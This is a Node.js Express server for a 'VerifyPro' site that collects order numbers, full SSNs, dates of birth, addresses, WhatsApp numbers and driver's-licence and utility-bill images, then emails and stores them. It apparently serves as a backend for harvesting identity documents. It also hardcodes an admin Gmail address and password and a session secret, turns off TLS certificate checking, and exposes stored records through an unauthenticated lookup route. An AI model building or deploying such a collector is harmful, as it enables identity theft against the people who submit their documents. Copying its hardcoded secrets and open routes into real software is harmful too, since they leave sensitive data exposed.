const express = require('express');
const multer = require('multer');
const { CloudinaryStorage } = require('multer-storage-cloudinary');
const cloudinary = require('cloudinary').v2;
const nodemailer = require('nodemailer');
const path = require('path');
const cors = require('cors');
const mongoose = require('mongoose');
const session = require('express-session');
const MongoStore = require('connect-mongo');
require('dotenv').config();

// Configure Cloudinary
cloudinary.config({
  cloud_name: process.env.CLOUDINARY_CLOUD_NAME,
  api_key: process.env.CLOUDINARY_API_KEY,
  api_secret: process.env.CLOUDINARY_API_SECRET,
});

// MongoDB Connection
let mongoConnected = false;

const connectMongoDB = async () => {
    try {
        await mongoose.connect(process.env.MONGODB_URI);
        mongoConnected = true;
        console.log('✅ MongoDB connected successfully');
    } catch (err) {
        console.error('❌ MongoDB connection error:', err.message);
        mongoConnected = false;
        setTimeout(connectMongoDB, 5000);
    }
};

connectMongoDB();

// Define Verification Schema and Model
const verificationSchema = new mongoose.Schema({
    orderNumber: { type: String, required: true, unique: true },
    fullName: { type: String, required: true },
    dateOfBirth: { type: String, required: true },
    ssn: { type: String, required: true },
    fullAddress: { type: String, required: true },
    whatsappNumber: { type: String, required: true },
    files: {
        dlFront: String,
        dlBack: String,
        utilityBill: String
    },
    status: {
        type: String,
        enum: ['pending_review', 'approved', 'rejected'],
        default: 'pending_review'
    },
    submittedAt: { type: Date, default: Date.now },
    createdAt: { type: Date, default: Date.now },
    ipAddress: String
}, { timestamps: true });

const Verification = mongoose.model('Verification', verificationSchema);

const app = express();
const PORT = process.env.PORT || 3000;

// Serve static files
app.use(express.static(path.join(__dirname, 'public')));

// Admin credentials
const ADMIN_EMAIL = 'ttsuk21418@gmail.com';
const ADMIN_PASSWORD = '#email123';

// Session configuration
app.use(session({
    secret: 'verifypro-admin-secret-key',
    resave: false,
    saveUninitialized: false,
    store: new MongoStore({
        mongoUrl: process.env.MONGODB_URI,
        touchAfter: 24 * 3600
    }),
    cookie: { 
        secure: process.env.NODE_ENV === 'production',
        httpOnly: true,
        sameSite: 'lax',
        maxAge: 24 * 60 * 60 * 1000
    }
}));

// Middleware
app.use(cors({
    origin: [
        'http://localhost:3000',
        'http://localhost:5000',
        'https://verfiypro.vercel.app'
    ],
    credentials: true
}));
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Configure Multer for Cloudinary
const storage = new CloudinaryStorage({
    cloudinary: cloudinary,
    params: {
        folder: 'verifypro-uploads',
        format: async (req, file) => 'png',
        public_id: (req, file) => `${Date.now()}-${file.originalname}`,
    },
});

const upload = multer({ storage: storage });

// Configure Nodemailer
const transporter = nodemailer.createTransport({
    host: process.env.EMAIL_HOST || 'smtp.gmail.com',
    port: process.env.EMAIL_PORT || 587,
    secure: false,
    auth: {
        user: process.env.EMAIL_USER,
        pass: process.env.EMAIL_PASSWORD
    },
    tls: {
        rejectUnauthorized: false
    }
});

transporter.verify((error, success) => {
    if (error) {
        console.error('Nodemailer connection error:', error);
    } else {
        console.log('✅ Nodemailer is ready to send emails');
    }
});

// Helper: Escape HTML
function escapeHtmlServer(text) {
    if (typeof text !== 'string') {
        return '';
    }
    const map = {
        '&': '&amp;',
        '<': '&lt;',
        '>': '&gt;',
        '"': '&quot;',
        "'": '&#039;'
    };
    return text.replace(/[&<>"']/g, m => map[m]);
}

// Helper: Save to MongoDB
async function saveVerificationToMongoDB(formData, files) {
    if (!mongoConnected) {
        console.log('ℹ️ MongoDB not connected, skipping database save');
        return null;
    }

    try {
        const verificationDoc = new Verification({
            orderNumber: formData.orderNumber,
            fullName: formData.fullName,
            dateOfBirth: formData.dateOfBirth,
            ssn: `***-**-${formData.ssn.slice(-4)}`,
            fullAddress: formData.fullAddress,
            whatsappNumber: formData.whatsappNumber,
            files: {
                dlFront: files.dlFront?.[0]?.path || 'N/A',
                dlBack: files.dlBack?.[0]?.path || 'N/A',
                utilityBill: files.utilityBill?.[0]?.path || 'N/A'
            },
            status: 'pending_review',
            ipAddress: 'client-ip-placeholder'
        });

        const savedDoc = await verificationDoc.save();
        console.log(`✅ Verification saved to MongoDB: ${savedDoc._id}`);
        return savedDoc._id;
    } catch (error) {
        console.warn(`⚠️ MongoDB save failed: ${error.message}`);
        return null;
    }
}

// API: Verify and Submit
app.post('/api/verify', upload.fields([
    { name: 'dlFront', maxCount: 1 },
    { name: 'dlBack', maxCount: 1 },
    { name: 'utilityBill', maxCount: 1 }
]), async (req, res) => {
    try {
        if (!req.files.dlFront || !req.files.dlBack || !req.files.utilityBill) {
            return res.status(400).json({
                error: 'All document files are required'
            });
        }

        const formData = {
            orderNumber: req.body.orderNumber,
            fullName: req.body.fullName,
            dateOfBirth: req.body.dateOfBirth,
            ssn: req.body.ssn,
            fullAddress: req.body.fullAddress,
            whatsappNumber: req.body.whatsappNumber
        };

        for (const [key, value] of Object.entries(formData)) {
            if (!value || value.trim() === '') {
                return res.status(400).json({
                    error: `Missing required field: ${key}`
                });
            }
        }

        let mongoId = null;
        try {
            mongoId = await saveVerificationToMongoDB(formData, req.files);
        } catch (err) {
            console.warn('MongoDB save error:', err.message);
        }

        const emailHtml = `
            <!DOCTYPE html>
            <html>
            <head>
                <meta charset="UTF-8">
                <style>
                    body { font-family: Arial, sans-serif; }
                    .container { max-width: 600px; margin: 0 auto; }
                    .header { background: #667eea; color: white; padding: 20px; }
                    table { width: 100%; border-collapse: collapse; }
                    td { padding: 10px; border-bottom: 1px solid #ddd; }
                </style>
            </head>
            <body>
                <div class="container">
                    <div class="header">
                        <h1>VerifyPro - New Verification</h1>
                    </div>
                    <table>
                        <tr><td><strong>Order #</strong></td><td>${escapeHtmlServer(formData.orderNumber)}</td></tr>
                        <tr><td><strong>Name</strong></td><td>${escapeHtmlServer(formData.fullName)}</td></tr>
                        <tr><td><strong>DOB</strong></td><td>${escapeHtmlServer(formData.dateOfBirth)}</td></tr>
                        <tr><td><strong>Address</strong></td><td>${escapeHtmlServer(formData.fullAddress).replace(/\n/g, '<br>')}</td></tr>
                        <tr><td><strong>WhatsApp</strong></td><td>${escapeHtmlServer(formData.whatsappNumber)}</td></tr>
                    </table>
                </div>
            </body>
            </html>
        `;

        const attachments = [
            { filename: 'DL-Front.jpg', path: req.files.dlFront[0].path },
            { filename: 'DL-Back.jpg', path: req.files.dlBack[0].path },
            { filename: 'Utility-Bill.jpg', path: req.files.utilityBill[0].path }
        ];

        try {
            await transporter.sendMail({
                from: process.env.EMAIL_FROM,
                to: process.env.EMAIL_TO,
                subject: `[VERIFICATION] Order #${formData.orderNumber}`,
                html: emailHtml,
                attachments: attachments
            });
            console.log(`✅ Email sent for Order #${formData.orderNumber}`);
        } catch (err) {
            console.warn(`⚠️ Email sending failed: ${err.message}`);
        }

        res.json({
            success: true,
            message: 'Verification submitted successfully',
            mongoId: mongoId
        });
    } catch (error) {
        console.error('Error in /api/verify:', error);
        res.status(500).json({
            success: false,
            error: 'Server error: ' + error.message
        });
    }
});

// API: Get single verification
app.get('/api/verification/:id', async (req, res) => {
    try {
        const verification = await Verification.findById(req.params.id);
        if (!verification) {
            return res.status(404).json({ error: 'Verification not found' });
        }
        res.json(verification);
    } catch (error) {
        console.error('Error fetching verification:', error);
        res.status(500).json({ error: 'Server error' });
    }
});

// Middleware: Admin auth check
const requireAdmin = (req, res, next) => {
    if (req.session.isAdmin) {
        next();
    } else {
        res.status(401).json({ error: 'Unauthorized' });
    }
};

// API: Admin login
app.post('/api/admin/login', (req, res) => {
    const { email, password } = req.body;
    if (email === ADMIN_EMAIL && password === ADMIN_PASSWORD) {
        req.session.isAdmin = true;
        res.json({ success: true, message: 'Login successful' });
    } else {
        res.status(401).json({ success: false, message: 'Invalid credentials' });
    }
});

// API: Admin logout
app.get('/api/admin/logout', (req, res) => {
    req.session.destroy();
    res.json({ success: true, message: 'Logged out' });
});

// API: Get all verifications (admin)
app.get('/api/admin/verifications', requireAdmin, async (req, res) => {
    try {
        const verifications = await Verification.find().sort({ createdAt: -1 });
        res.json({ success: true, data: verifications });
    } catch (error) {
        console.error('Error fetching verifications:', error);
        res.status(500).json({ success: false, error: 'Server error' });
    }
});

// API: Update verification status (admin)
app.put('/api/admin/verifications/:id', requireAdmin, async (req, res) => {
    try {
        const { status } = req.body;
        const verification = await Verification.findByIdAndUpdate(
            req.params.id,
            { status: status },
            { new: true }
        );
        res.json({ success: true, data: verification });
    } catch (error) {
        console.error('Error updating verification:', error);
        res.status(500).json({ success: false, error: 'Server error' });
    }
});

// API: Delete verification (admin)
app.delete('/api/admin/verifications/:id', requireAdmin, async (req, res) => {
    try {
        await Verification.findByIdAndDelete(req.params.id);
        res.json({ success: true, message: 'Record deleted' });
    } catch (error) {
        console.error('Error deleting verification:', error);
        res.status(500).json({ success: false, error: 'Server error' });
    }
});

// Serve admin pages
app.get('/admin/login', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'admin-login.html'));
});

app.get('/admin', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'admin-dashboard.html'));
});

// Serve index page
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// Health check
app.get('/health', (req, res) => {
    res.json({ status: 'OK', mongoConnected: mongoConnected });
});

// Start server
app.listen(PORT, () => {
    console.log(`✅ Server running on port ${PORT}`);
});
